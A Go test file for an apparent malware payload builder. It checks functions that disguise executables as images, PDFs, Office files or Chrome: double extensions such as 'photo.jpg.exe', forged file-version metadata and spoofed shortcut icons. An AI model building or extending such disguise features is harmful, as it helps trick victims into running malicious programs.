package payload

import "testing"

func TestNormalizeDisguise(t *testing.T) {
	cases := map[string]string{
		"JPEG": "jpg", "jpeg": "jpg", "DOCX": "doc", "word": "doc",
		"XLSX": "xls", " PDF ": "pdf", "chrome": "chrome", "": "",
	}
	for in, want := range cases {
		if got := NormalizeDisguise(in); got != want {
			t.Errorf("NormalizeDisguise(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestDisguiseExtFor(t *testing.T) {
	cases := map[string]string{
		"jpg": ".jpg", "jpeg": ".jpg", "pdf": ".pdf", "doc": ".docx",
		"word": ".docx", "xls": ".xlsx", "zip": ".zip", "txt": ".txt",
		"png": ".png", "folder": "", "chrome": "", "": "", "exe": "",
	}
	for in, want := range cases {
		if got := DisguiseExtFor(in); got != want {
			t.Errorf("DisguiseExtFor(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestApplyDisguiseFilename(t *testing.T) {
	cases := []struct{ name, disguise, want string }{
		{"photo.exe", "jpg", "photo.jpg.exe"},
		{"photo.jpg.exe", "jpg", "photo.jpg.exe"},
		{"report.pdf.exe", "doc", "report.docx.exe"}, // no stacking
		{"setup", "chrome", "setup.exe"},
		{"notes", "txt", "notes.txt.exe"},
		{"shot", "png", "shot.png.exe"},
		{"agent.exe", "", "agent.exe"},
		{"data", "folder", "data.exe"},
	}
	for _, c := range cases {
		if got := ApplyDisguiseFilename(c.name, c.disguise); got != c.want {
			t.Errorf("ApplyDisguiseFilename(%q,%q) = %q, want %q", c.name, c.disguise, got, c.want)
		}
	}
}

func TestDisguiseFileMetaKnown(t *testing.T) {
	for _, d := range []string{"jpg", "pdf", "doc", "xls", "zip", "txt", "png", "folder", "chrome"} {
		fd, cn, fv, pv := DisguiseFileMeta(d)
		if fd == "" || cn == "" || fv == "" || pv == "" {
			t.Errorf("DisguiseFileMeta(%q) has empty field", d)
		}
		fv16, pv16 := DisguiseFileVers(d)
		if fv16 == ([4]uint16{}) || pv16 == ([4]uint16{}) {
			t.Errorf("DisguiseFileVers(%q) parsed to zero", d)
		}
	}
}

func TestAllowedDisguise(t *testing.T) {
	for _, d := range []string{"jpg", "jpeg", "pdf", "doc", "docx", "word", "xls", "xlsx", "zip", "txt", "png", "folder", "chrome"} {
		if !AllowedDisguise(d) {
			t.Errorf("AllowedDisguise(%q) = false, want true", d)
		}
	}
	if AllowedDisguise("scr") || AllowedDisguise("exe") {
		t.Error("AllowedDisguise accepted unknown type")
	}
}

func TestDisguiseLnkIcon(t *testing.T) {
	zipWant := "%SystemRoot%\\System32\\zipfldr.dll,0"
	if got := DisguiseLnkIcon("zip", "a.zip.exe"); got != zipWant {
		t.Errorf("zip lnk icon = %q, want %q", got, zipWant)
	}
	if got := DisguiseLnkIcon("pdf", "Report.pdf.exe"); got != "Report.pdf.exe,0" {
		t.Errorf("pdf lnk icon = %q, want sibling exe icon", got)
	}
	if got := DisguiseLnkIcon("", ""); got != DefaultLnkIconLocation {
		t.Errorf("empty lnk icon = %q, want default", got)
	}
	if got := DisguiseLnkIcon("doc", ""); got != DefaultLnkIconLocation {
		t.Errorf("icon without exe = %q, want default", got)
	}
}
